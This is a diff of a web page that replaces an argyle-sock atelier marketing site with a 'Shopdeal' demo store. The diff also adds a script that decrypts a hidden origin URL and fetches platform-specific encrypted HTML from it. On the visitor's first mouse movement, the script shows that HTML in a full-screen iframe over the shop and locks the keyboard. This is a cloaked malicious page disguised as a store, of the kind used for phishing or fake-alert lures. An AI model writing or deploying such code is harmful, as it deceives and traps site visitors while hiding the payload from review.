-          </div>
-          <div style="display:flex;gap:1rem;align-items:flex-start;">
-            <div style="width:32px;height:32px;border-radius:50%;background:var(--color-accent);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;flex-shrink:0;">2</div>
-            <div>
-              <h4 style="font-family:var(--font-serif);font-size:1.15rem;color:var(--color-slate-900);margin-bottom:0.25rem;">True Intarsia Diamond Block</h4>
-              <p style="font-size:0.9rem;color:var(--color-slate-600);">Individual color yarn blocks linked stitch-by-stitch without floating horizontal floats that catch on toes during dressing.</p>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
             </div>
-          </div>
-          <div style="display:flex;gap:1rem;align-items:flex-start;">
-            <div style="width:32px;height:32px;border-radius:50%;background:var(--color-accent);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;flex-shrink:0;">3</div>
-            <div>
-              <h4 style="font-family:var(--font-serif);font-size:1.15rem;color:var(--color-slate-900);margin-bottom:0.25rem;">Hand-Linked Seamless Toe Pocket</h4>
-              <p style="font-size:0.9rem;color:var(--color-slate-600);">Loop-by-loop hand linking forms a continuous, completely flat knitted surface across the tops of the toes, eliminating shoe abrasion.</p>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
             </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
           </div>
         </div>
       </div>
-      <div>
-        <img src="assets/images/hand_linked_seamless_toe_finishing.jpg" alt="Hand linked seamless toe finishing" style="border-radius:var(--radius-md);box-shadow:var(--shadow-lg);border:1px solid var(--color-border);">
-      </div>
-    </div>
-  </div>
-</section>
+    </section>
 
-<!-- Section 6: Mercer Street Atelier Heritage -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="grid-2" style="align-items:center;">
-      <div>
-        <img src="assets/images/mercer_street_hosiery_salon.jpg" alt="Mercer street hosiery salon" style="border-radius:var(--radius-md);box-shadow:var(--shadow-md);border:1px solid var(--color-border);">
-      </div>
-      <div>
-        <span class="section-tag">Manhattan Atelier History</span>
-        <h2 class="section-title">Scottish Craftsmanship in SoHo Since 1994</h2>
-        <p class="section-lead" style="margin-bottom:1.5rem;">
-          Situated at 181 Mercer Street in New York, ArgyleKnitUp operates an authentic artisan knitting atelier preserving the traditional Scottish intarsia craft.
-        </p>
-        <p style="font-size:0.95rem;color:var(--color-slate-600);margin-bottom:1.5rem;">
-          Our master knitters train in the historic Scottish borders of Hawick and Galashiels before joining our Manhattan guild. Every pair of socks is knitted on dedicated circular frames, washed in demineralized spring water, pressed on hand-carved wooden leg boards, and individually inspected under 10x magnification.
-        </p>
-        <div style="display:flex;gap:2rem;">
-          <div>
-            <div style="font-family:var(--font-serif);font-size:2rem;font-weight:700;color:var(--color-accent);">30+</div>
-            <div style="font-size:0.8rem;font-family:var(--font-mono);color:var(--color-slate-600);text-transform:uppercase;">Years Guild Benchwork</div>
-          </div>
-          <div>
-            <div style="font-family:var(--font-serif);font-size:2rem;font-weight:700;color:var(--color-accent);">100%</div>
-            <div style="font-size:0.8rem;font-family:var(--font-mono);color:var(--color-slate-600);text-transform:uppercase;">Hand-Linked Toes</div>
-          </div>
-          <div>
-            <div style="font-family:var(--font-serif);font-size:2rem;font-weight:700;color:var(--color-accent);">181</div>
-            <div style="font-size:0.8rem;font-family:var(--font-mono);color:var(--color-slate-600);text-transform:uppercase;">Mercer St Studio</div>
-          </div>
-        </div>
-      </div>
-    </div>
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
   </div>
-</section>
 
-<!-- Section 7: Fleece Selection & Wool Sourcing -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Traceable Fleece Protocol</span>
-      <h2 class="section-title">Saxon Merino &amp; Mongolian Cashmere Sourcing</h2>
-      <p class="section-lead">
-        We exclusively source non-mulesed Saxon merino fleeces from ethical pastures in Australia and high-altitude underdown from nomadic Mongolian cooperatives.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/fine_gauge_merino_cashmere_yarn_spools.jpg" alt="Fine gauge merino cashmere yarn spools">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Fiber Diameter</span>
-          <h3 class="card-title">17.5-Micron Superfine</h3>
-          <p class="card-desc">
-            Finer than human cashmere cashmere, these ultra-slender fibers bend softly upon skin contact, completely preventing the prickly itch of coarse wools.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/textile_yarn_weave_macro_diamond.jpg" alt="Textile yarn weave macro diamond">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Natural Crimp Elasticity</span>
-          <h3 class="card-title">Natural Spring Memory</h3>
-          <p class="card-desc">
-            Each individual wool fiber possesses up to thirty natural microscopic crimps per inch, acting as natural coiled springs that maintain shape after washing.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/raw_botanical_fiber_harvest_lab.jpg" alt="Raw botanical fiber harvest lab">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Vapor Breathability</span>
-          <h3 class="card-title">Keratin Moisture Sorption</h3>
-          <p class="card-desc">
-            Merino wool can absorb up to thirty-five percent of its dry weight in moisture vapor without feeling damp, keeping feet dry and odor-free all day.
-          </p>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
 
-<!-- Section 8: Step-by-Step Benchwork Knitting Process -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Guild Methodology</span>
-      <h2 class="section-title">The Five Stages of Handcrafting Argyle Hosiery</h2>
-      <p class="section-lead">
-        Every pair of custom socks requires meticulous coordination between circular knitting mechanics and skilled hand assembly.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag" style="font-size:1.1rem;font-weight:700;">01</span>
-          <h3 class="card-title">Pattern Charting &amp; Feeder Setup</h3>
-          <p class="card-desc">
-            The 56-degree argyle diamond geometry is digitized into individual needle strike coordinates across the 200-needle cylinder matrix.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag" style="font-size:1.1rem;font-weight:700;">02</span>
-          <h3 class="card-title">Circular Intarsia Knitting</h3>
-          <p class="card-desc">
-            Separate yarn bobbins supply each color block. Needles reciprocate smoothly to lock adjacent diamond margins together without loose floats.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag" style="font-size:1.1rem;font-weight:700;">03</span>
-          <h3 class="card-title">Loop-by-Loop Hand Linking</h3>
-          <p class="card-desc">
-            The open toe is transferred to a curved linking dial where an artisan manually impales each stitch loop onto dial points, sewing them flat with matching yarn.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag" style="font-size:1.1rem;font-weight:700;">04</span>
-          <h3 class="card-title">Spring Water Scouring &amp; Milling</h3>
-          <p class="card-desc">
-            The socks are washed in pure softened water to bloom the cashmere and merino fibers, releasing natural lanolin and setting the diamond stitch tension.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag" style="font-size:1.1rem;font-weight:700;">05</span>
-          <h3 class="card-title">Boarding &amp; High-Pressure Steam</h3>
-          <p class="card-desc">
-            Wet socks are fitted onto mirror-smooth wooden leg boards and subjected to controlled steam cycles to lock in their anatomical calf and heel contours.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag" style="font-size:1.1rem;font-weight:700;">06</span>
-          <h3 class="card-title">Archival Registry &amp; Inspection</h3>
-          <p class="card-desc">
-            Every pair is examined under optical light tables for needle defects, tagged with its workshop batch card, and hand-wrapped in tissue paper.
-          </p>
-        </div>
-      </div>
-    </div>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
   </div>
-</section>
 
-<!-- Section 9: Lookbook Gallery -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Visual Archives</span>
-      <h2 class="section-title">The Mercer Street Hosiery Gallery</h2>
-      <p class="section-lead">
-        Explore scenes from our Manhattan knitting workshop, yarn winding racks, and finished bespoke commissions.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div style="border-radius:var(--radius-md);overflow:hidden;box-shadow:var(--shadow-sm);border:1px solid var(--color-border);height:280px;">
-        <img src="assets/images/circular_intarsia_knitting_loom.jpg" alt="Circular intarsia knitting loom" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-      <div style="border-radius:var(--radius-md);overflow:hidden;box-shadow:var(--shadow-sm);border:1px solid var(--color-border);height:280px;">
-        <img src="assets/images/knit_merino_textured_rib_cuff.jpg" alt="Knit merino textured rib cuff" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-      <div style="border-radius:var(--radius-md);overflow:hidden;box-shadow:var(--shadow-sm);border:1px solid var(--color-border);height:280px;">
-        <img src="assets/images/pattern_drafting_precision_bench.jpg" alt="Pattern drafting precision bench" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-      <div style="border-radius:var(--radius-md);overflow:hidden;box-shadow:var(--shadow-sm);border:1px solid var(--color-border);height:280px;">
-        <img src="assets/images/curated_hosiery_wardrobe_display.jpg" alt="Curated hosiery wardrobe display" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-      <div style="border-radius:var(--radius-md);overflow:hidden;box-shadow:var(--shadow-sm);border:1px solid var(--color-border);height:280px;">
-        <img src="assets/images/knitting_atelier_workshop_mercer.jpg" alt="Knitting atelier workshop mercer" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-      <div style="border-radius:var(--radius-md);overflow:hidden;box-shadow:var(--shadow-sm);border:1px solid var(--color-border);height:280px;">
-        <img src="assets/images/contemporary_tartan_palette_socks.jpg" alt="Contemporary tartan palette socks" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-    </div>
-  </div>
-</section>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX18k+G0kjyj75mMlfCkTzeNC+gcXJAVHFELnXrHVMUxcQe75KNXpm1mT";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-<!-- Section 10: Patron Testimonials & Sartorial Provenance -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Patron Provenance</span>
-      <h2 class="section-title">Reflections From Our Collector Community</h2>
-      <p class="section-lead">
-        Read firsthand appraisals from gentlemen, executives, and sartorial connoisseurs who wear ArgyleKnitUp hosiery daily.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div class="card">
-        <div class="card-body">
-          <p style="font-style:italic;color:var(--color-slate-700);margin-bottom:1.5rem;font-size:0.95rem;">
-            &ldquo;The hand-linked toe is a complete game changer. For someone who spends twelve hours a day in bespoke English oxfords, the absence of an abrasive toe seam eliminates foot fatigue entirely. The argyle diamonds stay crisp and unwrinkled.&rdquo;
-          </p>
-          <div style="margin-top:auto;">
-            <div style="font-weight:700;color:var(--color-slate-900);">Lord Alistair Sterling</div>
-            <div style="font-size:0.8rem;color:var(--color-slate-500);font-family:var(--font-mono);">Senior Partner, Mayfair Advisory Group</div>
-          </div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <p style="font-style:italic;color:var(--color-slate-700);margin-bottom:1.5rem;font-size:0.95rem;">
-            &ldquo;I have washed my Saxon merino argyle socks over fifty times, and they retain their elasticity, vibrant vegetable dye saturation, and stay-up grip. The true intarsia knit means no loose horizontal threads inside the sock.&rdquo;
-          </p>
-          <div style="margin-top:auto;">
-            <div style="font-weight:700;color:var(--color-slate-900);">David Kensington, MD</div>
-            <div style="font-size:0.8rem;color:var(--color-slate-500);font-family:var(--font-mono);">Chief of Cardiothoracic Surgery, Manhattan</div>
-          </div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <p style="font-style:italic;color:var(--color-slate-700);margin-bottom:1.5rem;font-size:0.95rem;">
-            &ldquo;Visiting the Mercer Street atelier to select bespoke diamond colorways and yarn weights was an unforgettable sartorial experience. ArgyleKnitUp embodies the very best of Scottish textile heritage in modern New York.&rdquo;
-          </p>
-          <div style="margin-top:auto;">
-            <div style="font-weight:700;color:var(--color-slate-900);">Charles Beaumont</div>
-            <div style="font-size:0.8rem;color:var(--color-slate-500);font-family:var(--font-mono);">Curator of Decorative Arts &amp; Textiles</div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-<!-- Section 11: Frequently Asked Questions -->
-<section class="section">
-  <div class="container-narrow">
-    <div class="section-header">
-      <span class="section-tag">Patron Guidance</span>
-      <h2 class="section-title">Frequently Asked Inquiries</h2>
-      <p class="section-lead">
-        Essential knowledge regarding argyle diamond geometry, hand-linked seams, and wool hosiery laundering.
-      </p>
-    </div>
-    <div class="faq-list">
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>What is the difference between true intarsia and jacquard knit socks?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Jacquard knitting leaves continuous horizontal strands of yarn (floats) across the inside of the sock behind color changes, which catch on toes and add unwanted bulk. True intarsia uses separate yarn bobbins for each diamond block, interlocking the edges cleanly without interior floats for a silky smooth interior.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>Why is a hand-linked toe seam so crucial for comfort?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Standard industrial socks use a machine overlock stitch (Rosso seam) that creates a thick, raised ridge across the toes. Over hours of walking in formal footwear, this ridge presses painfully against the metatarsals. Hand-linking connects loop-to-loop with a single thread, creating a completely flat, seamless join.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>How should I wash and care for luxury merino wool socks?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Turn socks inside out and machine wash on a gentle wool cycle (max 30&deg;C) using a specialized pH-neutral wool detergent with natural lanolin. Never tumble dry or bleach. Lay flat on a clean towel or dry naturally on sock boards to preserve fiber elasticity.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>Do over-the-calf socks stay up without slipping down the leg?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Yes. Our over-the-calf dress hose feature a graduated anatomical rib with embedded micro-elastomeric cores that grip the calf muscle gently without constricting circulation. Because the cuff sits comfortably above the widest curve of the calf, gravity cannot pull it down.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>Can I order bespoke colorway combinations for wedding parties?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Yes. We offer bespoke commission services at our 181 Mercer Street atelier. You can select specific tartan diamond colors, contrasting overcheck pinstripes, and custom monogram initials embroidered along the cuff.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>What warranty accompanies an ArgyleKnitUp commission?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Every pair of our socks includes a lifetime craftsmanship warranty covering hand-linked toe seam integrity and cuff elasticity under standard laundering guidelines. We maintain archival repair ledgers for all bespoke commissions.
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-<!-- Section 12: Bespoke Commission CTA Banner -->
-<section class="section section-subtle" style="border-top:1px solid var(--color-border);text-align:center;">
-  <div class="container-narrow">
-    <span class="hero-badge">&#9670; Private Commissions Open</span>
-    <h2 style="font-family:var(--font-serif);font-size:2.8rem;color:var(--color-slate-900);margin:1rem 0 1.25rem;">
-      Commission Your Bespoke Argyle Hosiery
-    </h2>
-    <p style="font-size:1.1rem;color:var(--color-slate-600);margin-bottom:2.5rem;line-height:1.7;">
-      Collaborate directly with our master knitters at 181 Mercer Street in New York City. Select your diamond colorways, Saxon merino yarn weights, overcheck striping, and custom initials.
-    </p>
-    <div style="display:flex;gap:1.25rem;justify-content:center;align-items:center;flex-wrap:wrap;">
-      <a href="contact.html" class="btn btn-primary" style="padding:0.9rem 2.25rem;font-size:1rem;">Submit Commission Dossier</a>
-      <a href="tel:+18887775845" class="btn btn-outline" style="padding:0.9rem 2.25rem;font-size:1rem;">Call Atelier: +1-888-777-5845</a>
-    </div>
-  </div>
-</section>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
-<footer class="site-footer">
-  <div class="container">
-    <div class="footer-grid">
-      <div class="footer-brand">
-        <h3>ArgyleKnitUp</h3>
-        <p>
-          Master hosiery atelier dedicated to Scottish argyle intarsia knitwear, fine-gauge Saxon merino wool, hand-linked seamless toes, and reinforced heel architecture engineered for decadal durability.
-        </p>
-        <p style="font-family:var(--font-mono);font-size:0.82rem;color:#94A3B8;">
-          100% Traceable Merino &bull; Hand-Linked in New York City
-        </p>
-      </div>
-      <div class="footer-col">
-        <h4>Navigation</h4>
-        <ul>
-          <li><a href="index.php">Atelier Home</a></li>
-          <li><a href="about.html">Hosiery Heritage</a></li>
-          <li><a href="blog.html">Textile Treatises</a></li>
-          <li><a href="contact.html">Commission Desk</a></li>
-        </ul>
-      </div>
-      <div class="footer-col">
-        <h4>Legal Policies</h4>
-        <ul>
-          <li><a href="privacy-policy.html">Privacy Policy</a></li>
-          <li><a href="terms-and-conditions.html">Terms &amp; Conditions</a></li>
-          <li><a href="disclaimer.html">Textile Disclaimer</a></li>
-          <li><a href="cookie-policy.html">Cookie Policy</a></li>
-        </ul>
-      </div>
-      <div class="footer-col">
-        <h4>Mercer Atelier</h4>
-        <div class="footer-contact-item">
-          <span>&#128205;</span>
-          <span>181 Mercer Street, New York, NY 10012, United States</span>
-        </div>
-        <div class="footer-contact-item">
-          <span>&#128222;</span>
-          <span><a href="tel:+18887775845">+1-888-777-5845</a></span>
-        </div>
-        <div class="footer-contact-item">
-          <span>&#9993;</span>
-          <span>concierge@argyleknitup.com</span>
-        </div>
-        <div style="margin-top:1.25rem;">
-          <span style="font-family:var(--font-mono);font-size:0.75rem;background:#2C3531;padding:0.35rem 0.75rem;border-radius:var(--radius-sm);color:#D4AF37;">
-            Bespoke Fittings by Appointment
-          </span>
-        </div>
-      </div>
-    </div>
-    <div class="footer-bottom">
-      <div>&copy; 2026 ArgyleKnitUp Atelier LLC. All worldwide rights reserved.</div>
-      <div style="display:flex;gap:1.5rem;">
-        <a href="privacy-policy.html">Privacy</a>
-        <a href="terms-and-conditions.html">Terms</a>
-        <a href="disclaimer.html">Disclaimer</a>
-        <a href="cookie-policy.html">Cookies</a>
-      </div>
-    </div>
-  </div>
-</footer>
-<script src="assets/js/main.js"></script>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
